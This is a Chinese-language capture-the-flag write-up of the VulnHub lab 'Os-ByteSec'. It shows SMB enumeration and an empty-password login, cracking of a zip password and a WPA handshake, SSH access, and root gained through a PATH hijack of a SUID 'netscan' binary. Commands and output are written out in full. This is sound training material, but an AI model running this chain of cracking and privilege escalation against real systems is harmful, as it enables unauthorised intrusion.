---
title: Os-ByteSec
date: 2023-10-21 16:20:27
categories: 
- Vulnhub
tags:
- 渗透测试
- 提权
- Linux
---
# Os-ByteSec

靶机地址[hackNos: Os-Bytesec ~ VulnHub](https://www.vulnhub.com/entry/hacknos-os-bytesec,393/)

目标为 普通用户的**user.txt**和root用户的**root.txt**

## 靶机配置

靶机网卡配置参考我之前的[Os-hackNos-1_witwitwiter的博客-CSDN博客](https://blog.csdn.net/witwitwiter/article/details/119889384?spm=1001.2014.3001.5501)

## 渗透测试

使用nmap进行端口扫描

```
└─# nmap -sV 192.168.5.135   
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-29 19:34 CST
Nmap scan report for 192.168.5.135 (192.168.5.135)
Host is up (0.00012s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE     VERSION
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
2525/tcp open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
MAC Address: 00:0C:29:13:48:B6 (VMware)
Service Info: Host: NITIN; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.79 seconds

```



使用```dirsearch```进行目录扫描

```
─# dirsearch -u "http://192.168.5.135/"

  _|. _ _  _  _  _ _|_    v0.4.1
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10877

Output File: /root/.dirsearch/reports/192.168.5.135/_21-08-29_19-39-13.txt

Error Log: /root/.dirsearch/logs/errors-21-08-29_19-39-13.log

Target: http://192.168.5.135/

[19:39:13] Starting: 
[19:39:13] 301 -  311B  - /js  ->  http://192.168.5.135/js/
[19:39:13] 301 -  313B  - /html  ->  http://192.168.5.135/html/
[19:39:14] 403 -  278B  - /.ht_wsr.txt                                                                                                             
[19:39:14] 403 -  278B  - /.htaccess.bak1
[19:39:14] 403 -  278B  - /.htaccess_extra
[19:39:14] 403 -  278B  - /.htaccess.sample
[19:39:14] 403 -  278B  - /.htaccess.save
[19:39:14] 403 -  278B  - /.htaccess_sc
[19:39:14] 403 -  278B  - /.htaccessOLD2
[19:39:14] 403 -  278B  - /.htaccess_orig
[19:39:14] 403 -  278B  - /.htaccessBAK
[19:39:14] 403 -  278B  - /.htm
[19:39:14] 403 -  278B  - /.htaccessOLD
[19:39:14] 403 -  278B  - /.htaccess.orig
[19:39:14] 403 -  278B  - /.htpasswd_test  
[19:39:14] 403 -  278B  - /.html
[19:39:14] 403 -  278B  - /.htpasswds              
[19:39:14] 403 -  278B  - /.httr-oauth     
[19:39:21] 301 -  312B  - /css  ->  http://192.168.5.135/css/                                                                 
[19:39:23] 301 -  316B  - /gallery  ->  http://192.168.5.135/gallery/                                             
[19:39:23] 200 -  738B  - /html/                                            
[19:39:23] 301 -  312B  - /img  ->  http://192.168.5.135/img/                  
[19:39:23] 200 -    3KB - /index.html                                                                                      
[19:39:23] 200 -    2KB - /js/                                                                                                   
[19:39:25] 301 -  313B  - /news  ->  http://192.168.5.135/news/                                                   
[19:39:27] 403 -  278B  - /server-status                                                                            
[19:39:27] 403 -  278B  - /server-status/
                                                                                                                              
Task Completed 
```





使用nmap测试smb安全

```
└─# nmap -v -p139,445 --script=smb-vuln-*.nse --script-args=unsafe=1 192.168.5.135

Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-29 19:47 CST
NSE: Loaded 11 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 19:47
Completed NSE at 19:47, 0.00s elapsed
Initiating ARP Ping Scan at 19:47
Scanning 192.168.5.135 [1 port]
Completed ARP Ping Scan at 19:47, 0.09s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 19:47
Completed Parallel DNS resolution of 1 host. at 19:47, 0.01s elapsed
Initiating SYN Stealth Scan at 19:47
Scanning 192.168.5.135 (192.168.5.135) [2 ports]
Discovered open port 445/tcp on 192.168.5.135
Discovered open port 139/tcp on 192.168.5.135
Completed SYN Stealth Scan at 19:47, 0.15s elapsed (2 total ports)
NSE: Script scanning 192.168.5.135.
Initiating NSE at 19:47
Completed NSE at 19:47, 5.17s elapsed
Nmap scan report for 192.168.5.135 (192.168.5.135)
Host is up (0.00049s latency).

PORT    STATE SERVICE
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
MAC Address: 00:0C:29:13:48:B6 (VMware)

Host script results:
|_smb-vuln-ms10-054: ERROR: Script execution failed (use -d to debug)
|_smb-vuln-ms10-061: false
| smb-vuln-regsvc-dos: 
|   VULNERABLE:
|   Service regsvc in Microsoft Windows systems vulnerable to denial of service
|     State: VULNERABLE
|       The service regsvc in Microsoft Windows 2000 systems is vulnerable to denial of service caused by a null deference
|       pointer. This script will crash the service if it is vulnerable. This vulnerability was discovered by Ron Bowes
|       while working on smb-enum-sessions.
|_          

NSE: Script Post-scanning.
Initiating NSE at 19:47
Completed NSE at 19:47, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 5.93 seconds
           Raw packets sent: 3 (116B) | Rcvd: 3 (116B)

```



使用smbmap进行测试，发现可以匿名访问但无权限

```
└─# smbmap -H 192.168.5.135                                                                                                                                                                                    1 ⨯
[+] Guest session       IP: 192.168.5.135:445   Name: 192.168.5.135                                     
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        IPC$                                                    NO ACCESS       IPC Service (nitin server (Samba, Ubuntu))

```



使用enum4linux测试

```
└─# enum4linux -U 192.168.5.135
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sun Aug 29 20:11:41 2021

 ========================== 
|    Target Information    |
 ========================== 
Target ........... 192.168.5.135
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ===================================================== 
|    Enumerating Workgroup/Domain on 192.168.5.135    |
 ===================================================== 
[+] Got domain/workgroup name: WORKGROUP

 ====================================== 
|    Session Check on 192.168.5.135    |
 ====================================== 
[+] Server 192.168.5.135 allows sessions using username '', password ''

 ============================================ 
|    Getting domain SID for 192.168.5.135    |
 ============================================ 
Domain Name: WORKGROUP
Domain Sid: (NULL SID)
[+] Can't determine if host is part of domain or part of a workgroup

 ============================== 
|    Users on 192.168.5.135    |
 ============================== 
index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: smb      Name:   Desc: 

user:[smb] rid:[0x3e8]
enum4linux complete on Sun Aug 29 20:11:41 2021

```



使用默认参数直接跑```enum4linux 192.168.5.135```

![image-20230628230305489](image-20230628230305489.png)

得到sagar、blackjax、smb这三个用户

经过测试只有smb这个用户的密码在不输入的情况能够读取。即smb用户是空密码。

```
└─# smbmap -u smb  -H 192.168.5.135 
[+] IP: 192.168.5.135:445       Name: 192.168.5.135                                     
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  READ ONLY       Printer Drivers
        IPC$                                                    NO ACCESS       IPC Service (nitin server (Samba, Ubuntu))

```

使用smbclient登录进去,提示输入密码，直接回车

```
└─# smbclient //192.168.5.135/smb -U smb
Enter WORKGROUP\smb's password: 
Try "help" to get a list of possible commands.
smb: \> 
```

使用ls列出文件

```
smb: \> ls
  .                                   D        0  Mon Nov  4 19:50:37 2019
  ..                                  D        0  Mon Nov  4 19:37:28 2019
  main.txt                            N       10  Mon Nov  4 19:45:38 2019
  safe.zip                            N  3424907  Mon Nov  4 19:50:37 2019

                9204224 blocks of size 1024. 6831688 blocks available

```

使用get下载这两个文件

```
smb: \> get main.txt 
getting file \main.txt of size 10 as main.txt (1.4 KiloBytes/sec) (average 1.4 KiloBytes/sec)
smb: \> get safe.zip 
getting file \safe.zip of size 3424907 as safe.zip (65581.0 KiloBytes/sec) (average 57666.3 KiloBytes/sec)
```

查看文件内容

```
└─# cat main.txt       
helo
```

解压safe.zip时发现有密码

```
└─# unzip safe.zip                            
Archive:  safe.zip
[safe.zip] secret.jpg password: 
   skipping: secret.jpg              incorrect password
   skipping: user.cap                incorrect password

```

使用john破解密码

```
┌──(root💀kali)-[~]
└─# zip2john safe.zip > safepass                                                                                                                                                                              82 ⨯
ver 2.0 efh 5455 efh 7875 safe.zip/secret.jpg PKZIP Encr: 2b chk, TS_chk, cmplen=60550, decmplen=62471, crc=6D48091C
ver 2.0 efh 5455 efh 7875 safe.zip/user.cap PKZIP Encr: 2b chk, TS_chk, cmplen=3364011, decmplen=6920971, crc=717BA9D6
NOTE: It is assumed that all files in each archive have the same password.
If that is not the case, the hash may be uncrackable. To avoid this, use
option -o to pick a file at a time.
                                                                                                                                                                                                                   
┌──(root💀kali)-[~]
└─# john safepass 
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Warning: Only 6 candidates buffered for the current salt, minimum 8 needed for performance.
Warning: Only 3 candidates buffered for the current salt, minimum 8 needed for performance.
Warning: Only 6 candidates buffered for the current salt, minimum 8 needed for performance.
Warning: Only 4 candidates buffered for the current salt, minimum 8 needed for performance.
Warning: Only 3 candidates buffered for the current salt, minimum 8 needed for performance.
Almost done: Processing the remaining buffered candidate passwords, if any.
Warning: Only 1 candidate buffered for the current salt, minimum 8 needed for performance.
Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist
hacker1          (safe.zip)
1g 0:00:00:00 DONE 2/3 (2021-08-29 21:06) 20.00g/s 1680Kp/s 1680Kc/s 1680KC/s fireballs..faithfaith
Use the "--show" option to display all of the cracked passwords reliably
Session completed

```



或者使用```fcrackzip```

```
└─# fcrackzip -D -p /usr/share/wordlists/rockyou.txt -u safe.zip


PASSWORD FOUND!!!!: pw == hacker1

```

得到密码为```hacker1```



解压后得到secret.jpg和user.cap

图片上没得到什么有用的信息



user.cap是一个wifi抓包

使用```aircrack-ng```破解密码



```
aircrack-ng -w /usr/share/wordlists/rockyou.txt user.cap


                               Aircrack-ng 1.6 

      [00:00:00] 2354/10303727 keys tested (9801.73 k/s) 

      Time left: 17 minutes, 30 seconds                          0.02%

                           KEY FOUND! [ snowflake ]


      Master Key     : 88 D4 8C 29 79 BF DF 88 B4 14 0F 5A F3 E8 FB FB 
                       59 95 91 7F ED 3E 93 DB 2A C9 BA FB EE 07 EA 62 

      Transient Key  : 1F 89 42 F4 E2 74 8B 00 00 00 00 00 00 00 00 00 
                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 

      EAPOL HMAC     : ED B5 F7 D9 56 98 B0 5E 25 7D 86 08 C4 D4 02 3D 

```

得到密码```snowflake```



ssh登录,之前nmap扫描出ssh端口为2525，故加上-p 2525

```
└─# ssh blackjax@192.168.5.135 -p 2525  
```

使用```python3 -c 'import pty;pty.spawn("/bin/bash")'```切换shell

得到user.txt

```
blackjax@nitin:~$ cat /home/blackjax/user.txt 
  _    _  _____ ______ _____        ______ _               _____ 
 | |  | |/ ____|  ____|  __ \      |  ____| |        /\   / ____|
 | |  | | (___ | |__  | |__) |_____| |__  | |       /  \ | |  __ 
 | |  | |\___ \|  __| |  _  /______|  __| | |      / /\ \| | |_ |
 | |__| |____) | |____| | \ \      | |    | |____ / ____ \ |__| |
  \____/|_____/|______|_|  \_\     |_|    |______/_/    \_\_____|
                                                                 
                                                                 

Go To Root.

MD5-HASH : f589a6959f3e04037eb2b3eb0ff726ac

```





尝试sudo提权,失败后查找具有root权限的命令

```
blackjax@nitin:~$ sudo su root
[sudo] password for blackjax: 
blackjax is not in the sudoers file.  This incident will be reported.
blackjax@nitin:~$ find / -perm -u=s -type f 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/snapd/snap-confine
/usr/lib/i386-linux-gnu/lxc/lxc-user-nic
/usr/lib/eject/dmcrypt-get-device
/usr/bin/newgidmap
/usr/bin/gpasswd
/usr/bin/newuidmap
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/at
/usr/bin/pkexec
/usr/bin/newgrp
/usr/bin/netscan
/usr/bin/sudo
/bin/ping6
/bin/fusermount
/bin/mount
/bin/su
/bin/ping
/bin/umount
/bin/ntfs-3g

```



使用netscan，发现与netstat -natp差不多

```
blackjax@nitin:~$ netscan
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:2525            0.0.0.0:*               LISTEN      1153/sshd       
tcp        0      0 0.0.0.0:445             0.0.0.0:*               LISTEN      1010/smbd       
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      1181/mysqld     
tcp        0      0 0.0.0.0:139             0.0.0.0:*               LISTEN      1010/smbd       
tcp        0      0 192.168.5.135:2525      192.168.5.129:54132     ESTABLISHED 3415/sshd: blackjax
tcp6       0      0 :::2525                 :::*                    LISTEN      1153/sshd       
tcp6       0      0 :::445                  :::*                    LISTEN      1010/smbd       
tcp6       0      0 :::139                  :::*                    LISTEN      1010/smbd       
tcp6       0      0 :::80                   :::*                    LISTEN      1264/apache2 
```

使用```xxd /usr/bin/netscan```查看二进制文件，发现确实调用了netstat -natp。

![image-20230628230353627](image-20230628230353627.png)

那么尝试用这个命令进行提权，注意这里写入的文件是netstat而不是netscan

```
blackjax@nitin:~$ cd /tmp
blackjax@nitin:/tmp$ echo "/bin/bash" >netstat
blackjax@nitin:/tmp$ chmod 775 netstat
blackjax@nitin:/tmp$ export PATH=/tmp:$PATH
blackjax@nitin:/tmp$ netscan
root@nitin:/tmp# id
uid=0(root) gid=0(root) groups=0(root),1001(blackjax)

```



获得最后的root.txt

```
root@nitin:/tmp# cat /root/root.txt 
    ____  ____  ____  ______   ________    ___   ______
   / __ \/ __ \/ __ \/_  __/  / ____/ /   /   | / ____/
  / /_/ / / / / / / / / /    / /_  / /   / /| |/ / __  
 / _, _/ /_/ / /_/ / / /    / __/ / /___/ ___ / /_/ /  
/_/ |_|\____/\____/ /_/____/_/   /_____/_/  |_\____/   
                     /_____/                           
Conguratulation..

MD5-HASH : bae11ce4f67af91fa58576c1da2aad4b

Author : Rahul Gehlaut

Contact : https://www.linkedin.com/in/rahulgehlaut/

WebSite : jameshacker.me

```

## 注意事项

提权所用的命令是netcan，netscan调用的命令是netstat，所以用netstat来劫持环境变量。